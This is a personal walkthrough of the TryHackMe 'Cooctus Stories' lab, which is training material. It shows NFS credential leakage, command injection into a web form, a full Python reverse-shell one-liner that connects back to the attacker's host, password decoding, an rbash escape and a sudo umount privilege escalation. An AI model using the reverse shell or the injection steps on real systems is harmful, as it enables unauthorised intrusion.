---
title: "Cooctus Stories"
date: 2025-2-15
draft: false
description: TryHackMe's Medium Room 
Tags:
- TryHackMe
- Linux
- Medium
---

## Enumeration
```
 rustscan -a 10.10.7.155
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/k21/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.7.155:22
Open 10.10.7.155:111
Open 10.10.7.155:2049
Open 10.10.7.155:8080
Open 10.10.7.155:35145
Open 10.10.7.155:45441
Open 10.10.7.155:49801
Open 10.10.7.155:57783
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 19:32 +0545
Initiating Ping Scan at 19:32
Scanning 10.10.7.155 [4 ports]
Completed Ping Scan at 19:32, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:32
Completed Parallel DNS resolution of 1 host. at 19:32, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:32
Scanning 10.10.7.155 (10.10.7.155) [8 ports]
Discovered open port 35145/tcp on 10.10.7.155
Discovered open port 2049/tcp on 10.10.7.155
Discovered open port 8080/tcp on 10.10.7.155
Discovered open port 111/tcp on 10.10.7.155
Discovered open port 49801/tcp on 10.10.7.155
Discovered open port 57783/tcp on 10.10.7.155
Discovered open port 45441/tcp on 10.10.7.155
Discovered open port 22/tcp on 10.10.7.155
Completed SYN Stealth Scan at 19:32, 0.20s elapsed (8 total ports)
Nmap scan report for 10.10.7.155 (10.10.7.155)
Host is up, received timestamp-reply ttl 60 (0.17s latency).
Scanned at 2025-02-15 19:32:16 +0545 for 0s

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 60
111/tcp   open  rpcbind    syn-ack ttl 60
2049/tcp  open  nfs        syn-ack ttl 60
8080/tcp  open  http-proxy syn-ack ttl 60
35145/tcp open  unknown    syn-ack ttl 60
45441/tcp open  unknown    syn-ack ttl 60
49801/tcp open  unknown    syn-ack ttl 60
57783/tcp open  unknown    syn-ack ttl 60

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
           Raw packets sent: 12 (504B) | Rcvd: 48 (10.220KB)


```

```
 nmap -sVC 10.10.7.155 -oA nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 19:31 +0545
Nmap scan report for 10.10.7.155 (10.10.7.155)
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (reset)
Bug in rpcinfo: no string output.
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3-4 (RPC #100003)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: CCHQ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds

```

We can find this at port 8080.
![](Pasted%20image%2020250215193637.png)

And this after doing a quick directory busting.
![](Pasted%20image%2020250215193707.png)
And we can do this,
`showmount -e 10.10.7.155
`
![](Pasted%20image%2020250215200242.png)

And this,
`sudo mount -t nfs 10.10.7.155:/var/nfs/general /mnt/nfs`
![](Pasted%20image%2020250215200257.png)

And we got the credentials.bak.
```
paradoxial.test
ShibaPretzel79
```
## Exploit

And we logged in successfully.
![](Pasted%20image%2020250215200510.png)
So its saying we can test a payload and then i tried this.
![](Pasted%20image%2020250215200920.png)
Hmmm lets try to use '&' and '|' which might work.
Lets run this after '&' or '|'.
`ping tun0 -c 2`

And lets see if it pings or not.
`sudo tcpdump -i tun0 icmp `

And we can see it works.
![](Pasted%20image%2020250215201523.png)
![](Pasted%20image%2020250215201550.png)

Now lets try to get a reverse shell.
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.11.3",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

And we got it.
![](Pasted%20image%2020250215201754.png)

## Privilege Escalation

After this, we can see this.
![](Pasted%20image%2020250215202239.png)
And,
```
paradox@cchq:/home/szymex$ cat SniffingCat.py
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
paradox@cchq:/home/szymex$ 

```

And we can also see a crontab.
![](Pasted%20image%2020250215202731.png)
Hmmm so if we could do something with that .py file, we might do something.
And after bit talk with GPTs,that password(encrypted) can be reversed and it is just rot13.
![](Pasted%20image%2020250215204945.png)

And we can also use script.
```
def decode(enc):
    dec = ''
    for i in enc:
        if ord(i) > 109:  # Characters above 'm' (ASCII 109)
            num = ord(i) - 13
            if num < 97:  # If it goes below 'a' (ASCII 97), wrap around
                num = 122 - (96 - num)
            dec += chr(num)
        else:
            dec += chr(ord(i) + 13)
    return dec

# Encoded password
enc_pw = "pureelpbxr"

# Decode and print the password
print("Decoded Password:", decode(enc_pw))

```

And we got the password.
`cherrycoke`.
![](Pasted%20image%2020250215205136.png)

Lets login with user `szymex`.
![](Pasted%20image%2020250215205236.png)
And we can also see interesting group.
`1004(testers)`

We can use this command.
`find / -group testers \( -readable -o -writable \) 2>/dev/null
`
And we got few things.
![](Pasted%20image%2020250215210014.png)
```
szymex@cchq:~$ find / -group testers \( -readable -o -writable \) 2>/dev/null
/home/tux/tuxling_3
/home/tux/tuxling_3/note
/home/tux/tuxling_1
/home/tux/tuxling_1/nootcode.c
/home/tux/tuxling_1/note

/media/tuxling_2
/media/tuxling_2/private.key
/media/tuxling_2/note
/media/tuxling_2/fragment.asc

```

Found a lots of things.
![](Pasted%20image%2020250215210552.png)
![](Pasted%20image%2020250215210634.png)
Also we can find this.
```
szymex@cchq:/home/tux/tuxling_3$ ls
note
szymex@cchq:/home/tux/tuxling_3$ cat note 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.

```

And this strings from that c program, it might be that fragment too.
`f96050ad61`.
Ohh Now I understand we need to find all that fragments.
So,
1-->f96050ad61
2-->6eaf62818d
3-->637b56db1552

And we can find this.
![](Pasted%20image%2020250215211710.png)
Firstly,lets import that private key.
`gpg --import private.key
`
And then,decrypt it.
`gpg --decrypt fragment.asc

![](Pasted%20image%2020250215211928.png)
And we got a last one.

With that, we have all.
1-->f96050ad61
2-->6eaf62818d
3-->637b56db1552

`f96050ad616eaf62818d637b56db1552`

But what is it.
Ohh it was md5 hash.
![](Pasted%20image%2020250215212247.png)
We got the password.
`tuxykitty`.
![](Pasted%20image%2020250215212402.png)
And we can see this.
![](Pasted%20image%2020250215212654.png)
Hmmm lets check it out.
![](Pasted%20image%2020250215212715.png)
Hmm.
We can also see a new group.
Lets again find.
`find / -group os_tester \( -readable -o -writable \) 2>/dev/null`
![](Pasted%20image%2020250215213847.png)
We can also see this.
![](Pasted%20image%2020250215213916.png)
There is a .git directory.
Lets go there and enumerate.
![](Pasted%20image%2020250215214714.png)
And we can see more by this.
`git show 6919df5c171460507f69769bc20e19bd0838b74d`
![](Pasted%20image%2020250215214930.png)

And that might be a password needed before.
`slowroastpork`.
Lets see.
And it worked.
![](Pasted%20image%2020250215215120.png)
But its a rbash shell.
![](Pasted%20image%2020250215215228.png)
And we can go to normal shell by this.
```
Run vi or vim.

Enter command mode(ESC) and type
:set shell=/bin/sh
:shell

and then,
/bin/bash

```

![](Pasted%20image%2020250215215607.png)
Now lets become root.
And we can see this.
![](Pasted%20image%2020250215220013.png)
Now after a quick search we can see this.
`https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/`

So we are gonna do.
`cat /etc/fstab`
We will see mounted directory.
![](Pasted%20image%2020250215220816.png)

Then,we will do this.
`sudo /bin/umount /opt/CooctFS`
If we unmount this folder, original files, that existed before the directory is mounted, may appear.
And we can see that.
![](Pasted%20image%2020250215221321.png)
And its a root directory.
And there is another twist.
![](Pasted%20image%2020250215221421.png)
Hmmmm.
But we now have a root access by a ssh.
![](Pasted%20image%2020250215221514.png)
And we are root.
![](Pasted%20image%2020250215221656.png)
But where is a root flag.
Ohh it just appears when we get logged as root.
![](Pasted%20image%2020250215222008.png)

## Complete

And done.
![](Pasted%20image%2020250215222116.png)
